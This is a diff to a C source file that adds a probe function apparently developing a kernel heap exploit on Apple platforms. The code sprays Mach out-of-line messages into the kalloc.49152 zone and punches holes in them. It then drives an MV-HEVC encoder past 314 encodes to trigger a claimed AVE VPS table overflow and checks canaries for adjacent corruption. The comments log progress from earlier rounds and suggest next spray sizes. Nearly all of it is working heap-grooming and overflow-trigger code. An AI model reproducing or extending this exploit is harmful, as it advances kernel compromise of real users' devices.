@@ -14099,6 +14099,215 @@ static void r335_probe(void) {
     fflush(stdout);
 }
 
+/* r338: AVE Heap Overflow with Mach OOL + Correct Encoder Path
+   r337 found 0 actual corruption — the manual VTCompressionSession setup
+   didn't trigger the VPS table overflow path. Must use create_mvhevc_encoder()
+   with explicit MVHEVCVideoLayerIDs + encode_one_stereo_lid() which r331
+   proved triggers the VPS overflow at >314 encodes. Combined with Mach OOL
+   spray targeting kalloc.49152. Also fixes false positive canary check. */
+static void r338_probe(void) {
+    rlog("\n=== r338: AVE Overflow + OOL Spray (Correct Encoder) ===\n");
+    rlog("  Using create_mvhevc_encoder + encode_one_stereo_lid (proven path)\n");
+    rlog("  Mach OOL spray targets kalloc.49152 for corruption detection\n\n");
+    fflush(stdout);
+
+    /* Phase 1 verify first */
+    if (phase1_verify() != 0) {
+        rlog("  FAIL: MV-HEVC not available\n");
+        return;
+    }
+
+    /* ---- Part 1: OOL spray ---- */
+    rlog("--- Part 1: Mach OOL spray (0xC000 kalloc.49152) ---\n");
+    fflush(stdout);
+
+    #define R338_OOL_SIZE  0xC000
+    #define R338_PORTS     512
+    #define R338_CANARY    0xBE
+
+    uint8_t *ool_data = (uint8_t *)malloc(R338_OOL_SIZE);
+    if (!ool_data) { rlog("  FAIL: malloc\n"); return; }
+    memset(ool_data, R338_CANARY, R338_OOL_SIZE);
+
+    mach_port_t spray_ports[R338_PORTS];
+    int ports_ok = 0, msgs_ok = 0;
+
+    for (int i = 0; i < R338_PORTS; i++) {
+        kern_return_t kr = mach_port_allocate(mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE, &spray_ports[i]);
+        if (kr != KERN_SUCCESS) { spray_ports[i] = MACH_PORT_NULL; break; }
+        kr = mach_port_insert_right(mach_task_self(), spray_ports[i],
+            spray_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+        if (kr != KERN_SUCCESS) {
+            mach_port_deallocate(mach_task_self(), spray_ports[i]);
+            spray_ports[i] = MACH_PORT_NULL;
+            break;
+        }
+        mach_port_limits_t lim = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+        mach_port_set_attributes(mach_task_self(), spray_ports[i],
+            MACH_PORT_LIMITS_INFO, (mach_port_info_t)&lim,
+            MACH_PORT_LIMITS_INFO_COUNT);
+        ports_ok++;
+
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } msg;
+        memset(&msg, 0, sizeof(msg));
+        msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+        msg.hdr.msgh_size = sizeof(msg);
+        msg.hdr.msgh_remote_port = spray_ports[i];
+        msg.hdr.msgh_local_port = MACH_PORT_NULL;
+        msg.hdr.msgh_id = 0x42424242;
+        msg.body.msgh_descriptor_count = 1;
+        msg.ool.address = ool_data;
+        msg.ool.size = R338_OOL_SIZE;
+        msg.ool.deallocate = 0;
+        msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+        kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+            sizeof(msg), 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+        if (kr == KERN_SUCCESS) msgs_ok++;
+    }
+    rlog("  Sprayed %d ports, %d OOL msgs (0x%X each = %d MB)\n",
+         ports_ok, msgs_ok, R338_OOL_SIZE,
+         (int)((uint64_t)msgs_ok * R338_OOL_SIZE / (1024*1024)));
+    fflush(stdout);
+
+    /* ---- Part 2: Create holes ---- */
+    rlog("\n--- Part 2: Free alternating OOL (create holes) ---\n");
+    fflush(stdout);
+    int holes = 0;
+    for (int i = 1; i < ports_ok; i += 2) {
+        if (spray_ports[i] == MACH_PORT_NULL) continue;
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+            mach_msg_trailer_t trailer;
+        } rmsg;
+        memset(&rmsg, 0, sizeof(rmsg));
+        kern_return_t kr = mach_msg(&rmsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+            0, sizeof(rmsg), spray_ports[i], 100, MACH_PORT_NULL);
+        if (kr == KERN_SUCCESS && rmsg.ool.address && rmsg.ool.size > 0) {
+            mach_vm_deallocate(mach_task_self(),
+                (mach_vm_address_t)rmsg.ool.address, rmsg.ool.size);
+            holes++;
+        }
+        mach_port_destroy(mach_task_self(), spray_ports[i]);
+        spray_ports[i] = MACH_PORT_NULL;
+    }
+    rlog("  Created %d holes\n", holes);
+    fflush(stdout);
+
+    /* ---- Part 3: AVE encode with CORRECT lid=1 path ---- */
+    rlog("\n--- Part 3: AVE encode lid=1 (350 frames, proven overflow path) ---\n");
+    fflush(stdout);
+
+    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
+    int enc_ok = 0, enc_err = 0;
+    if (s) {
+        for (int f = 0; f < 350; f++) {
+            int st = encode_one_stereo_lid(s, f, 1920, 1080, 1);
+            if (st == 0) enc_ok++;
+            else enc_err++;
+            if (f % 100 == 0) {
+                rlog("  Frame %d: ok=%d err=%d\n", f, enc_ok, enc_err);
+                fflush(stdout);
+            }
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        rlog("  Encode complete: %d ok, %d err (need >314 for overflow)\n", enc_ok, enc_err);
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+    } else {
+        rlog("  FAIL: create_mvhevc_encoder returned NULL\n");
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: Receive OOL messages and check corruption ---- */
+    rlog("\n--- Part 4: Check OOL canaries for corruption ---\n");
+    fflush(stdout);
+
+    int checked = 0, corrupted = 0;
+    for (int i = 0; i < ports_ok; i += 2) {
+        if (spray_ports[i] == MACH_PORT_NULL) continue;
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+            mach_msg_trailer_t trailer;
+        } rmsg;
+        memset(&rmsg, 0, sizeof(rmsg));
+        kern_return_t kr = mach_msg(&rmsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+            0, sizeof(rmsg), spray_ports[i], 100, MACH_PORT_NULL);
+        if (kr != KERN_SUCCESS || !rmsg.ool.address || rmsg.ool.size == 0) continue;
+
+        checked++;
+        uint8_t *d = (uint8_t *)rmsg.ool.address;
+        uint32_t dsz = rmsg.ool.size;
+
+        /* Check ALL canary bytes */
+        int bad = 0;
+        int first_bad = -1;
+        for (int b = 0; b < (int)dsz && bad < 1024; b++) {
+            if (d[b] != R338_CANARY) {
+                if (first_bad < 0) first_bad = b;
+                bad++;
+            }
+        }
+
+        if (bad > 0) {
+            corrupted++;
+            rlog("  *** PORT[%d] CORRUPTED: %d bad bytes, first @ 0x%X ***\n",
+                 i, bad, first_bad);
+            /* Dump at corruption point */
+            int ds = (first_bad > 0 ? first_bad : 0) & ~0xF;
+            rlog("    @0x%04X: ", ds);
+            for (int x = ds; x < ds + 64 && x < (int)dsz; x++)
+                rlog("%02X ", d[x]);
+            rlog("\n");
+            /* Also dump start of allocation (overflow from PREVIOUS alloc hits here) */
+            rlog("    @0x0000: ");
+            for (int x = 0; x < 64 && x < (int)dsz; x++)
+                rlog("%02X ", d[x]);
+            rlog("\n");
+            /* Dump end of allocation (overflow FROM this alloc hits NEXT) */
+            int es = (int)dsz - 64;
+            if (es < 0) es = 0;
+            rlog("    @0x%04X: ", es);
+            for (int x = es; x < (int)dsz; x++)
+                rlog("%02X ", d[x]);
+            rlog("\n");
+        }
+
+        mach_vm_deallocate(mach_task_self(),
+            (mach_vm_address_t)rmsg.ool.address, rmsg.ool.size);
+        mach_port_destroy(mach_task_self(), spray_ports[i]);
+        spray_ports[i] = MACH_PORT_NULL;
+    }
+
+    rlog("  Checked %d, corrupted %d\n", checked, corrupted);
+    if (corrupted > 0) {
+        rlog("  *** HEAP CORRUPTION CONFIRMED! ***\n");
+        rlog("  AVE VPS table overflow wrote into adjacent kalloc.49152 OOL data!\n");
+    } else {
+        rlog("  No corruption. VPS table may use a different zone/bucket.\n");
+        rlog("  Try: different OOL sizes (0x9C00, 0xA000) to match VPS table zone.\n");
+    }
+
+    /* Cleanup */
+    for (int i = 0; i < ports_ok; i++)
+        if (spray_ports[i] != MACH_PORT_NULL)
+            mach_port_destroy(mach_task_self(), spray_ports[i]);
+    free(ool_data);
+
+    rlog("\n=== r338 complete ===\n");
+    fflush(stdout);
+}
+
 /* r337: AVE Heap Overflow with Mach OOL Message Spray
    r336 showed IOSurface backing doesn't use kalloc.49152. The correct spray
    for kalloc zones is Mach OOL (out-of-line) message descriptors — kernel
@@ -46028,6 +46237,12 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 341) {
+            rlog("*** rounds=341: AVE Overflow + OOL Spray (correct encoder) ***\n");
+            rlog("  r337: 0 real corruption (wrong encoder path). Using create_mvhevc_encoder.\n\n");
+            r338_probe();
             goto done;
         }
         if (rounds == 340) {
